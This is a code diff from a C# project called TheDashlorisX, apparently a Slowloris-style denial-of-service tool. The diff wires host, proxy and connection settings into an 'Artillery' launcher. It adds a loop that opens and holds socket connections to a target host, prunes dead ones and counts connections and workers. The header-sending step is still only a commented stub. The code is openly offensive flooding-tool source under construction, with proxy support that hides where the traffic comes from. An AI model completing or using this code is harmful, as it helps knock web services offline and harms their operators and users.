@@ -179,25 +179,25 @@ namespace TheDashlorisX
 		{ IsBackground = true }.Start();
 
 		/*Send Delay, Timeout, Dash Workers, Max Cons, Content Length and UAR*/
-		(int, int, int, int, int, bool) Tier2Configuration = ParseSect2(S3Class2);
+		(int, int, int, int, int, bool) Tier2 = ParseSect2(S3Class2);
 		/*Proxy Hosts and Proxy Credentials*/
-		(List<string>, List<string>) Tier3Configuration = ParseSect3(S3Class2);
+		(List<string>, List<string>) Tier3 = ParseSect3(S3Class2);
 		/*Host, Port, Duration and HTTP Version*/
-		(string, int, int, string) Tier1Configuration = ParseSect1(S3Class1);
+		(string, int, int, string) Tier1 = ParseSect1(S3Class1);
 
-		if (Tier1Configuration.Item1 == null)
+		if (Tier1.Item1 == null)
 		{
 		    Print("The main host panel settings section was found incorrectly setup. Invalid values detected!");
 		    return;
 		}
 
-		else if (Tier2Configuration.Item1 == -1)
+		else if (Tier2.Item1 == -1)
 		{
 		    Print("The main fancy settings section was found incorrectly setup. Invalid values detected!");
 		    return;
 		}
 
-		else if (Tier3Configuration.Item1 == null)
+		else if (Tier3.Item1 == null)
 		{
 		    Print("The proxy configuration section was found incorrectly setup. Invalid values detected!");
 		    return;
@@ -208,7 +208,7 @@ namespace TheDashlorisX
 		// Check if Workers < Max Connections
 		//
 
-		Artillery.Launch(this, SprucyLog);
+		Artillery.Launch(this, SprucyLog, Tier1, Tier2, Tier3);
 	    }
 
 	    catch (Exception E)
@@ -292,7 +292,42 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    public void Launch(AttaccLog Inst, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, bool) Tier2, (List<string>, List<string>) Tier3)
+	    private void SendArtillery((string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
+	    {
+		try
+		{
+		    //1: Construct Header (Get HTTP Version, User-Agent-Randomizator and Content Length) 
+		    //2: Send Header
+		}
+
+		catch (Exception E)
+		{
+		    throw (ErrorHandler.GetException(E));
+		}
+	    }
+
+	    private void ReportStatics(bool Add)
+	    {
+		try
+		{
+		    if (Add)
+		    {
+			//Add to Cons and Workers
+		    }
+
+		    else
+		    {
+			//Remove from Cons and Workers
+		    }
+		}
+
+		catch (Exception E)
+		{
+		    throw (ErrorHandler.GetException(E));
+		}
+	    }
+
+	    public void Launch(AttaccLog Inst, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2, (List<string>, List<string>) Tier3)
 	    {
 		try
 		{
@@ -330,8 +365,8 @@ namespace TheDashlorisX
 
 					if (DashShell.Connected)
 					{
-					    //Send Data
-					    //Update Statistics
+					    SendArtillery(Tier1, Tier2);
+					    ReportStatics(true);//Add 
 
 					    Connections.Add(DashShell);
 					}
@@ -344,8 +379,16 @@ namespace TheDashlorisX
 					Thread.Sleep(SendDelay);
 				    }
 
-				    // Add background-worker that checks if connections are still live.
-				    // If not, remove entry from list.
+				    for (int Id = 0; Id < Connections.Count; Id += 1)
+				    {
+					if (!Connections[Id].Connected)
+					{
+					    Connections[Id].Close();
+					    Connections.RemoveAt(Id);
+
+					    ReportStatics(false);//Remove
+					}
+				    }
 
 				    Thread.Sleep(SendDelay);
 				}
@@ -381,10 +424,6 @@ namespace TheDashlorisX
 			    DashWorker.Join();
 			}
 		    }
-		    
-		    //DashWorkers.Clear();
-		    // Only gets here if threads are all dead.
-		    // Cleanup here.
 		    
 		    StopDurationCounter();
 		}
